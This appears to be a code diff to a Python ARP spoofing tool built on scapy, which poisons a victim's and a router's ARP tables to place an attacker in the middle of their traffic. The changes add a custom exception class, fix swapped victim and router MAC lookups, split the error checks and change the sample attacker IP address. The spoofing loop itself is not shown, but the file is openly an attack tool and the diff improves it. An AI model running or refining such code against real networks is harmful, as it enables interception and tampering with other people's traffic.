@@ -2,6 +2,15 @@ from scapy.all import ARP, Ether, send, sniff, IP, TCP, srp
 import time
 
 
+class ExceptionMacAddress(Exception):
+    def __init__(self, message):
+        super().__init__(message)  # Initialize the base class (Exception) with the message
+        # self.context = context  # Store the context data
+
+    def __str__(self):
+        return f"{self.args[0]}"
+
+
 class ARPSpoofer:
     def __init__(self,victim_ip:str,router_ip:str,attacker_mac:str,victim_mac=None,router_mac=None,clockRate=None) -> None:
         '''
@@ -24,11 +33,7 @@ class ARPSpoofer:
         self.victim_mac = victim_mac
         self.router_mac = router_mac
         self.clockRate = clockRate
-        print('self.victim_ip',self.victim_ip)
-        print('self.victim_mac',self.victim_mac)
-        print('self.router_ip',self.router_ip)
-        print('self.router_mac',self.router_mac)
-        print('self.attacker_mac',self.attacker_mac)
+    
        
 
     def getContextMac(self,victime=True)->str:
@@ -73,19 +78,22 @@ class ARPSpoofer:
         # Get the router's MAC address
         print("VICTIM MAC",self.victim_mac)
         if not self.victim_mac :
-            self.getContextMac(victime=False)
+            self.getContextMac(victime=True)
         else :
             print("VICTIM MAC",self.victim_mac)
             
         # Get the victim's MAC address
         if not self.router_mac :
-            self.getContextMac(victime=True)
+            self.getContextMac(victime=False)
         else :
             print("ROUTER MAC",self.router_mac)
 
-        if self.victim_mac is None or self.router_mac is None:
+        if self.victim_mac is None :
             # exit(1)
-            raise Exception("Could not find MAC addresses. Ensure the devices are reachable.")
+            raise ExceptionMacAddress("Could not get victim MAC addresse. Ensure the device is reachable.")
+        if  self.router_mac is None :
+            # exit(1)
+            raise ExceptionMacAddress("Could not get gtw MAC addresse. Ensure the devices are reachable.")
 
         print("Starting ARP spoofing...")
         
@@ -114,7 +122,7 @@ if __name__ == "__main__":
         'mac' : "80:ca:4b:ac:f3:3"
     }
     attacker = {
-        'ip' : '192.168.1.72',
+        'ip' : '192.168.1.73',
         'mac' : "ac:bc:32:91:0a:ad"
     }
     a = ARPSpoofer(
